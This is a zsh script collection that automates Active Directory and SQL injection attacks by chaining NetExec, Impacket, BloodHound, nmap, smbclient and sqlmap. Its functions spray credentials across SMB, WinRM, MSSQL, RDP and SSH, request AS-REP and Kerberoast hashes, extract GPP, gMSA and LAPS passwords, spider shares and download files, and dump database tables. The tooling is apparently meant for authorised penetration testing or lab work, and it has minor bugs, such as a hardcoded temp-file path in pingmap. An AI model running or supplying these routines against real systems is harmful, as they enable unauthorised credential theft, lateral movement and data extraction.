#!/bin/zsh
# Scripts to run a bunch of tools sequentially and automate a lot of the mindless, repetitive process of enumeration.
# Heavy lifting done mostly by NetExec, Impacket and SQLMap when applicable. 
# Copyright (C) 2024 chsoares
# Permission to copy and modify is granted under the GNU General Public License
# Last revised 3/2024


# ADSCAN
# Runs fping on the network to find live hosts and outputs their IPs to targets.list. 
# The list then gets passed onto NetExec to enumerate the machines further and get the hosts and domain names. 
# Lastly, it adds the DC’s IP and domain name to /etc/hosts to make our lives easier.
#------------------------------------------------------------------------------------
# Usage: adscan 172.0.0.1/24
adscan() {

    echo '
             |\033[1;33m   __|   __|    \     \ | \033[0m
   _` |   _` |\033[1;33m \__ \  (      _ \   .  | \033[0m
 \__,_| \__,_|\033[1;33m ____/ \___| _/  _\ _|\_| \033[0m                                      
'  

      
    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
    
    local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
    if ! [[ $@ =~ $cidr_pattern ]]; then
        echo "\033[1;31m[!] \"$@\" is not a valid CIDR range. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
                                       
    echo "\033[1;33m[!] Running fping on the $1 network \033[0m"  
    fping -agq "$1" | tee targets.list
    if [[ -z $(grep '[^[:space:]]' targets.list) ]] ; then
        echo "\033[1;31m[!] Empty results. Maybe you got your parameters wrong? \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
    echo '\033[0;34m[*] Saving enumerated hosts to ./targets.list \033[0m'
    
    echo '\033[1;33m[!] Running NetExec on enumerated hosts \033[0m'
    nxc smb targets.list | tee nxc.tmp
    
    local hosts_count=$(cat nxc.tmp | head -n -1 | wc -l)
    
    echo '\033[1;36m[?] Add hosts to /etc/hosts? [y/N] \033[0m'
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then    
      head -n 5 /etc/hosts > /etc/tmp && mv /etc/tmp /etc/hosts
      for i in {1..$hosts_count}; do
        is_dc=$(cat nxc.tmp | sed -n "${i}p" | grep -i DC | wc -l)
        if [[ is_dc -eq 1 ]]; then
          domain=$(cat nxc.tmp | sed -n "${i}p" | grep -oP "\(name:.*\)" | cut -d ' ' -f 2 | sed "s/(//" | sed "s/)//" | cut -d ':' -f 2)
          dc_hostname=$(cat nxc.tmp | sed -n "${i}p" | grep -oP "\(name:.*\)" | cut -d ' ' -f 1 | sed "s/(//" | sed "s/)//" | cut -d ':' -f 2)
          dc_ip=$(cat nxc.tmp | sed -n "${i}p" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
          echo "$dc_ip    $dc_hostname $domain $dc_hostname.$domain" | tee -a /etc/hosts
        else          
          dc_hostname=$(cat nxc.tmp | sed -n "${i}p" | grep -oP "\(name:.*\)" | cut -d ' ' -f 1 | sed "s/(//" | sed "s/)//" | cut -d ':' -f 2)
          dc_ip=$(cat nxc.tmp | sed -n "${i}p" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
          echo "$dc_ip    $dc_hostname $dc_hostname.$domain" | tee -a /etc/hosts
        fi  
      done        
    fi   
    
    rm nxc.tmp
    echo "\033[1;31m[*] Done. \033[0m"
}

# TESTCREDS
# Runs NetExec with given credentials against SMB / WinRM / MSSQL / RDP / SSH so we can test the account’s potential
#------------------------------------------------------------------------------------
# Usage: testcreds -u user [-p password] [-H hash] [-k] [--ips ips.list]
testcreds() {

    echo '  
  |               |  \033[1;33m   __|  _ \  __|  _ \    __| \033[0m
   _|   -_) (_-<   _|\033[1;33m  (       /  _|   |  | \__ \ \033[0m
 \__| \___| ___/ \__|\033[1;33m \___| _|_\ ___| ___/  ____/ \033[0m
'                                               
    
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -u user [-p password] [-H hash] [-k] [-t ips.list]"
        return 1
    fi 
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -u user [-p password] [-H hash] [-k] [-t ips.list]"
        return 1
    fi
        
    echo -e "\033[1;33m[!] Trying credentials on SMB / WinRM / MSSQL / RDP / SSH with NetExec\033[0m"
    nxc smb $(echo "$nxc_auth") | grep --color=never +  | highlight red "(Pwn3d!)"  
    nxc smb $(echo "$nxc_auth") --local-auth | grep --color=never +  | highlight red "(Pwn3d!)"  
    nxc winrm $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc winrm $(echo "$nxc_auth") --local-auth | grep --color=never + | highlight red "(Pwn3d!)"
    nxc mssql $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc mssql $(echo "$nxc_auth") --local-auth | grep --color=never + | highlight red "(Pwn3d!)"
    nxc rdp $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    nxc rdp $(echo "$nxc_auth") --local-auth | grep --color=never +  | highlight red "(Pwn3d!)"
    if [[ "$auth" == "password" ]]; then
        nxc ssh $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
    fi
    echo "\033[1;31m[*] Done. \033[0m"
}

# ENUMDOMAIN
# Takes a target Domain Controller and optionally (preferably!) a set of credentials 
# and runs a bunch of NetExec and Impacket scripts sequentially to extract some juicy information about the domain.
#------------------------------------------------------------------------------------
#Usage: enumdomain -t target -u user [-p password] [-H hash] [-k]
enumdomain() {
    echo '   
                           \033[1;33m  _ \   _ \   \  |    \   _ _|   \ | \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | (   | |\/ |   _ \    |   .  | \033[0m
   \___| _| _| \_,_| _|_|_|\033[1;33m ___/ \___/ _|  _| _/  _\ ___| _|\_| \033[0m
'                                                               
    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi     
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi   
    #debug
    #echo "nxc = $nxc_auth"
    #echo "imp = $imp_auth"
    #end debug    
    
    echo "\033[1;36m[?] Do you want to enumerate all domain users? This might take a while. [y/N] \033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then    
      echo "\033[1;33m[!] Enumerating all users with NetExec \033[0m"
      nxc smb $(echo "$nxc_auth") --users | tr -s " " | cut -d ' ' -f 5 | grep -v '\[.\]' | cut -d '\' -f 2 > users.list
      echo '\033[0;34m[*] Saving enumerated users to ./users.list'
    fi
    
    echo "\033[1;33m[!] Enumerating privileged users with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") --admin-count | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
    
    echo "\033[1;33m[!] Enumerating user descriptions with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M user-desc | grep --color=never -o "User:.*"
    
    echo "\033[1;33m[!] Enumerating delegation rights with Impacket \033[0m"
    findDelegation.py "$imp_auth" | tail -n +2 | grep --color=never "\S"
    
    echo "\033[1;33m[!] Enumerating DCSync rights with NetExec \033[0m"  
    local domain1=$(echo $domain | cut -d '.' -f 1)
    local domain2=$(echo $domain | cut -d '.' -f 2)
    nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
    
    echo "\033[1;33m[!] Searching for credentials in the GPO with NetExec \033[0m"
    nxc smb $(echo "$nxc_auth") -M gpp_password | grep -oE "\[\+\] Found credentials .*|userName:.*|Password:.*" --color=never
    nxc smb $(echo "$nxc_auth") -M gpp_autologin | grep -oE "\[\+\] Found credentials .*|Usernames:.*|Passwords:.*" --color=never
    
    echo "\033[1;33m[!] Enumerating PASSWD_NOTREQD with NetExec \033[0m" 
    nxc ldap $(echo "$nxc_auth") --password-not-required | grep --color=never -o "User:.*"
    
    echo "\033[1;33m[!] Enumerating AS-REProastable users with Impacket \033[0m"
    GetNPUsers.py $(echo "$imp_auth") | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
    GetNPUsers.py $(echo "$imp_auth") -request -outputfile asrep.hash 1>/dev/null
    echo '\033[0;34m[*] Saving hashes (if any) to ./asrep.hash \033[0m'
    
    echo "\033[1;33m[!] Enumerating Kerberoastable users with Impacket \033[0m"
    GetUserSPNs.py $(echo "$imp_auth") | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash 1>/dev/null
    echo '\033[0;34m[*] Saving hashes (if any) to ./kerb.hash \033[0m'
    
    echo "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then    
      echo "\033[1;33m[!] Ingesting AD data \033[0m"
      echo "\033[0;34m[*] Collection set to \'DC Only\'. Please run a more thorough collection separately if you wish."
      bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c dconly --zip | grep -oE [0-9]*_bloodhound\.zip > path.tmp
      mv $(cat path.tmp) ./${domain}_bloodhound.zip
      echo "\033[0;34m[*] Saving data to ./${domain}_bloodhound.zip"
      rm path.tmp
    fi
    echo "\033[1;31m[*] Done. \033[0m"
}

# ENUMUSER
# Follows the same idea of enumdomain, really. It runs a bunch of NetExec and Impacket scripts to enumerate user rights.
#------------------------------------------------------------------------------------
# #Usage: enumdomain -t target -u user [-p password] [-H hash] [-k]
enumuser() {
    echo '   
                           \033[1;33m  |  |   __|  __|  _ \ \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | \__ \  _|     / \033[0m
   \___| _| _| \_,_| _|_|_|\033[1;33m \__/  ____/ ___| _|_\ \033[0m
'    
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: \033[0m $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi 
    
    get_auth $@
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi        
    #debug
    #echo "nxc = $nxc_auth"
    #echo "imp = $imp_auth"
    #end debug
                                                   
    echo "\033[1;33m[!] Enumerating $user's groups with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
    
    echo "\033[1;33m[!] Trying to dump gMSA passwords with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") --gmsa | grep -oE "Account:.*" --color=never
    
    echo "\033[1;33m[!] Trying to dump LAPS passwords with NetExec \033[0m"
    nxc ldap $(echo "$nxc_auth") -M laps | tail -n +4 | tr -s " " | cut -d " " -f 6-
    
    echo "\033[1;33m[!] Trying to find KeePass files with NetExec \033[0m"
    nxc smb $(echo "$nxc_auth") -M keepass_discover | grep -oE "Found .*" --color=never
    echo "\033[1;31m[*] Done. \033[0m"
}
    
# ENUMSHARES
# Follows the same idea of enumdomain, really. It runs a bunch of NetExec and Impacket scripts to enumerate user readable shares.
#------------------------------------------------------------------------------------
# #Usage: enumshares [-t target] -u user [-p password] [-H hash] [-k]
enumshares() {
    echo '   
                         \033[1;33m   __|  |  |    \    _ \  __|   __| \033[0m
   -_)    \   |  |   ` \ \033[1;33m \__ \  __ |   _ \     /  _|  \__ \ \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m ____/ _| _| _/  _\ _|_\ ___| ____/ \033[0m
'    
       
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: \033[0m $0 [-t target] -u user [-p password] [-H hash] [-k]"
        return 1
    fi 
    
    cat /etc/hosts | tail -n +6 | tr -s ' ' | cut -d ' ' -f 2 > hostnames.tmp
    if [[ $1 == '-t' ]]; then
        echo "$2" > hostnames.tmp
        shift 2
    fi          
                                                   
    while read target; do
        echo "\033[1;33m[!] Enumerating $2's shares on $target \033[0m"
        nxc smb $target $@ --shares | grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- | tee ${target}_${user}_shares.tmp
        cat ${target}_${user}_shares.tmp | awk -F 'READ' '{print $1}' > ${target}_${user}_sharenames.tmp
        while read share; do
            echo "\033[1;36m[?] Spider "$share" share for interesting files? [y/N]\033[0m"
            read -s -q confirm
            if [[ $confirm =~ ^[Yy]$ ]]; then 
                echo "\033[0;34m[*] Searching for .txt/.xml/.ini/.config/.ps1 files \033[0m"
                nxc smb $target $@ --spider "$share" --regex ".txt|.xml|.config|.cnf|.conf|.ini|.ps1" | grep -v "\[.\]" | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee ${share}_files.tmp
                
                echo "\033[1;36m[?] Download files? [y/N]\033[0m"
                read -s -q confirm
                if [[ $confirm =~ ^[Yy]$ ]]; then 
                    dir_path=$(echo ${target}${2}${share} | tr -cd '[:alnum:]')
                    echo "\033[0;34m[*] Saving files to ./$dir_path \033[0m"
                    mkdir $dir_path > /dev/null 2>&1
                    while read files; do
                        share_path=$(echo $files | cut -d '/' -f -4)
                        file_path=$(echo $files | cut -d '/' -f 5- | sed 's/\//\\/g')
                        file_name=$(echo ${file_path##*\\})
                        smbclient $share_path -U "$domain\\$2%$4" -c "get $file_path ./$dir_path/$file_name" > /dev/null 2>&1
                    done < ${share}_files.tmp
                fi
                
            fi
        done < ${target}_${user}_sharenames.tmp
    done < hostnames.tmp
    rm *.tmp
    echo "\033[1;31m[*] Done. \033[0m"
}    

# PINGMAP
# Runs fping on the network to make a list of live hosts. 
# The list then gets passed onto nmap to scan the machines further for open ports and services. 
#------------------------------------------------------------------------------------
# Usage: pingmap [-F] 172.0.0.1/24
pingmap() {
    echo '
       _)              \033[1;33m   )     \ |    ) \033[0m                     
   _ \  |    \    _` | \033[1;33m  /     .  |   /  \033[0m    ` \    _` |  _ \ 
  .__/ _| _| _| \__, | \033[1;33m       _|\_|      \033[0m  _|_|_| \__,_| .__/ 
 _|             ____/  \033[1;33m                  \033[0m               _|                                           
'  
    if [ $# -eq 0 ]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 [-F] <CIDR Range>"
        return 1
    fi

    while [ $# -gt 1 ]; do
      case "$1" in
        --fast|-F)
          local fast=1
          ;;
        --*|-*)
          echo "\033[1;31m[!] Parameter '$1' not recognized. \033[0m"
          echo "Usage: $0 [-F] <CIDR Range>"
          return 1
          ;;
      esac 
      shift     
    done
    
        local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
    if ! [[ $@ =~ $cidr_pattern ]]; then
        echo "\033[1;31m[!] \"$@\" is not a valid CIDR range. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
    
    echo "\033[1;33m[!] Running fping on the $1 network\033[0m"  
    fping -agq "$1" | tee targets.list
    echo '\033[0;34m[*] Saving enumerated hosts to ./targets.list \033[0m'
    
    if [[ -z $(grep '[^[:space:]]' /root/scripts/pingmap.tmp) ]] ; then
        echo "\033[1;31m[!] Empty results. Maybe you got the syntax wrong? \033[0m"
        echo "Usage: $0 [-F] <CIDR Range>"
        return 1
    else
        #echo ""
    fi    
    
    mkdir scan_xml
    if [[ fast -eq 1 ]]; then
      echo '\033[1;33m[!] Running "nmap -T4 -Pn -sV -F --open" on enumerated hosts\033[0m'    
      while read item
        do
          echo "\033[0;36m[*] Scanning $item...\033[0m"
          nmap -T4 -Pn -sV -F --open "$item" -oX scan_xml/scan_${item}.xml | sed -n '/PORT/,$p' | head -n -2 | grep --color=never -v '^[[:space:]]*$'          
          #echo ""
        done < targets.list
    else
      echo '\033[1;33m[!] Running "nmap -T4 -Pn -sV -p- --open" on enumerated hosts\033[0m'    
      while read item
        do
          echo "\033[0;36m[*] Scanning $item...\033[0m"
          nmap -T4 -Pn -sV -p- --open "$item" -oX scan_xml/scan_${item}.xml | sed -n '/PORT/,$p' | head -n -2 | grep --color=never -v '^[[:space:]]*$'
          #echo ""
        done < targets.list
    fi
    echo "\033[1;36m[?] Take screenshot of hosts' web pages? [y/N] \033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then
      python3 ~/scripts/nmapmerge.py -d ./scan_xml -o ./scan_xml/scan.xml > /dev/null 2>&1
      mkdir gowitness && cd gowitness    
      echo "\033[1;33m[!] Screenshotting pages with GoWitness \033[0m"
      gowitness nmap -f ../scan_xml/scan.xml -t 8 -N > /dev/null 2>&1
      echo '\033[0;34m[*] Serving GoWitness report on http://localhost:7171. Press CTRL+C to exit.'
      gowitness server > /dev/null 2>&1
    fi
        
    echo "\033[1;31m[*] Done. \033[0m"
}


#!/bin/zsh

# enumsql
# Runs sqlmap on the db to do some enumeration. 
# Not much advantage between this and just running sqlmap other than a prettier output.
#------------------------------------------------------------------------------------
# Usage: enumsql target [options]
enumsql() {
    echo '
                         \033[1;33m    __|   _ \   |    \033[0m
   -_)    \   |  |   ` \ \033[1;33m  \__ \  (   |  |    \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m  ____/ \__\_\ ____| \033[0m
 '                              

    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: target [options]"
        return 1
    fi
    
    sqlmap $@ --batch | grep "Type:" > sqlmap.tmp
    if [[ $(grep -c "time-based" sqlmap.tmp) -eq 1 ]]; then
        echo "\033[1;31m[*] Time-based injection -- this might take a while. \033[0m"
    fi                               
    echo "\033[1;33m[!] Grabbing database banner \033[0m"
    sqlmap $@ --banner --batch | grep -E --color=never "technology:|DBMS:|banner:|system:"
    echo "\033[1;33m[!] Fetching current user \033[0m"
    sqlmap $@ --current-user --batch| grep -oP --color=never "(?<=current user: ').*(?=')"
    echo "\033[1;33m[!] Is current user database admin? \033[0m"
    sqlmap $@ --is-dba --batch| grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
    echo "\033[1;33m[!] Fetching current database \033[0m"
    sqlmap $@ --current-db --batch| grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.tmp
    echo "\033[1;33m[!] Fetching tables \033[0m"
    sqlmap $@ -D $(cat db.tmp) --tables --batch | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.tmp
    
    echo "\033[1;36m[?] Retrieve tables' schema? [y/N] \033[0m"
    read -s -q confirm
      if [[ $confirm =~ ^[Yy]$ ]]; then    
        echo "\033[1;33m[!] Retrieving schema \033[0m"
        sqlmap $@ -D $(cat db.tmp) --schema --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*"
      fi
    
    while read table
      do  
        echo "\033[1;36m[?] Do you want to dump table \"$table\"? [y/N] \033[0m"
        read -s -q confirm
        if [[ $confirm =~ ^[Yy]$ ]]; then    
          echo "\033[1;33m[!] Dumping table's contents \033[0m"
          sqlmap $@ -D $(cat db.tmp) -T $table --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
        fi
      done < tables.tmp
      rm tables.tmp db.tmp sqlmap.tmp
      echo "\033[1;31m[*] Done. \033[0m"
}

#              _                   _          __  __ 
#             | |                 | |        / _|/ _|
#     _____  _| |_ _ __ __ _   ___| |_ _   _| |_| |_ 
#    / _ \ \/ / __| '__/ _` | / __| __| | | |  _|  _|
#   |  __/>  <| |_| | | (_| | \__ \ |_| |_| | | | |  
#    \___/_/\_\\__|_|  \__,_| |___/\__|\__,_|_| |_|  
#                                                    
# 
#   Don't call these functions directly!                                                   


# OUTPUT HIGHLIGHTING
function highlight() {
	declare -A fg_color_map
	fg_color_map[black]=30
	fg_color_map[red]=31
	fg_color_map[green]=32
	fg_color_map[yellow]=33
	fg_color_map[blue]=34
	fg_color_map[magenta]=35
	fg_color_map[cyan]=36
	 
	fg_c=$(echo -e "\e[1;${fg_color_map[$1]}m")
	c_rs=$'\e[0m'
	sed -u s"/$2/$fg_c\0$c_rs/g"
}

# GET_AUTH
# Used by the other functions to parse the authentication arguments.
get_auth() {
    local target="targets.list"
    while [ $# -gt 0 ]; do
      case "$1" in
        --target|-t)
          target="$2"
          shift
          ;;
        --user|-u)
          user="$2"
          shift
          ;;
        --password|-p)
          password="$2"
          auth="password"
          shift
          ;;
        --hash|-H)
          hashes="$2"
          auth="hashes"
          shift
          ;;
        --kerb|-k)
          auth="kerb"
          shift
          ;;
        *)
          echo "\033[1;31m[!] Wrong parameters. \033[0m"
          return 2
          ;;
      esac
      shift
    done
    
    export dc_ip=$(cat /etc/hosts | grep -i $target | tr -s " " | cut -d " " -f 1)
    export domain=$(cat /etc/hosts | grep -i $target | tr -s " " | cut -d " " -f 2)
    export hostname=$(cat /etc/hosts | grep -i $target | tr -s " " | cut -d " " -f 3)
    export fqdn=$(cat /etc/hosts | grep -i $target | tr -s " " | cut -d " " -f 4)
    
    
    case $auth in
      password)
        nxc_auth="$target -u $user -p $password"
        imp_auth="$domain/$user:$password -dc-ip $dc_ip"
        ;;
      hashes)
        nxc_auth="$target -u $user -H $hashes"
        imp_auth="$domain/$user -hashes :$hashes -dc-ip $dc_ip"
        ;;
      kerb)
        nxc_auth="$target -u $user --use-kcache"
        imp_auth="$domain/$user -k -dc-ip $dc_ip"
        ;;
      *)
        nxc_auth="$target -u '' -p ''"
        imp_auth="$domain/ -dc-ip $dc_ip"
    esac
    blood_auth=$(echo $nxc_auth | grep -oE "\-u.*")
}
